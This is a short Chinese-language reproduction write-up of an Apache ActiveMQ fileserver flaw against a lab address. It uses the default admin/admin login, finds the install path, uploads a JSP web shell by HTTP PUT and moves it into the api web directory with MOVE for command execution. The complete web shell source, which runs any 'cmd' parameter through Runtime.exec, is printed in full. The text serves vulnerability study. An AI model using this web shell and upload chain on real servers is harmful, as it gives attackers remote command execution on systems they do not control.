ActiveMQ 是 Apache 软件基金会下的一个消息驱动中间件软件。Jetty 是一个 servlet 容器，它为基于 Java 的 web
容器，例如 JSP 和 servlet 运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后一个监控 ActiveMQ 的 Web
应用。

本文仅作漏洞复现记录与实现，利用流程如下:

## 1.漏洞环境

链接:http://192.168.101.152:8161

![1615539034_604b2b5ab27cafaf21aeb.png!small](https://image.3001.net/images/20210312/1615539034_604b2b5ab27cafaf21aeb.png!small)

## 2.利用

访问链接:
[http://192.168.101.152:8161](http://ip:8161/admin/test/systemProperties.jsp)[/admin/test/systemProperties.jsp](http://ip:8161/admin/test/systemProperties.jsp)

默认账户密码为:admin/admin

得到真实路径

![1615539169_604b2be1db0e73adaed10.png!small](https://image.3001.net/images/20210312/1615539169_604b2be1db0e73adaed10.png!small)

使用PUT方法上传小马至/fileserver/目录下

![1615539276_604b2c4cb2af4d6cf4400.png!small](https://image.3001.net/images/20210312/1615539276_604b2c4cb2af4d6cf4400.png!small)

    
    
    <%@ page import="java.io.*" %>
    <%
    try {
    String cmd = request.getParameter("cmd");
    Process child = Runtime.getRuntime().exec(cmd);
    InputStream in = child.getInputStream();
    int c;
    while ((c = in.read()) != -1) {
    out.print((char)c);
    }
    in.close();
    try {
    child.waitFor();
    } catch (InterruptedException e) {
    e.printStackTrace();
    }
    } catch (IOException e) {
    System.err.println(e);
    }
    %>

访问目标，没有解析

![1615539331_604b2c830b84723d19f11.png!small](https://image.3001.net/images/20210312/1615539331_604b2c830b84723d19f11.png!small)

使用MOVE方法将其转移至api或admin目录下

Destination: file:///opt/activemq/webapps/api/q.jsp

![1615539367_604b2ca76deb5f0e908ee.png!small](https://image.3001.net/images/20210312/1615539367_604b2ca76deb5f0e908ee.png!small)

上传成功后访问，执行

![1615539525_604b2d45a2ad65c93ede7.png!small](https://image.3001.net/images/20210312/1615539525_604b2d45a2ad65c93ede7.png!small)

执行成功

